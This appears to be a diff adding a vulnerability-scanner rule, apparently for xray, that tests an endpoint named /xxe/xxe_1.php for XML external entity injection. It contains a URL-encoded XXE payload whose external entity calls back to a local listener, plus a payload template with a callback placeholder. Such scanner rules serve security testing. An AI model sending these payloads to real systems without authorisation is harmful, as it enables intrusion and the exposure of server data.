@@ -1,0 +1,16 @@
+name: xxe_1
+rules:
+  - method: POST
+    path: /xxe/xxe_1.php
+    follow_redirects: false
+    body: submit=%E6%8F%90%E4%BA%A4&xml=%3C%3Fxml+version%3D%221.0%22%3F%3E%3C%21DOCTYPE+ANY+%5B%3C%21ENTITY+content+SYSTEM+%22http%3A%2F%2F127.0.0.1%3A61458%2Fi%2F4a4fb8%2Fkoy4%2Fxcdg%2F%22%3E%5D%3E%3Ca%3E%26content%3B%3C%2Fa%3E
+    expression: response.status==200 && lengthDiff
+  - method: POST
+    path: /xxe/xxe_1.php
+    follow_redirects: false
+    body: submit=1
+    expression: response.status==200 && lengthDiff
+detail:
+  type: xxe
+  paramkey: xml
+  payload: <?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "XRAY_RURL">]><a>&content;</a>
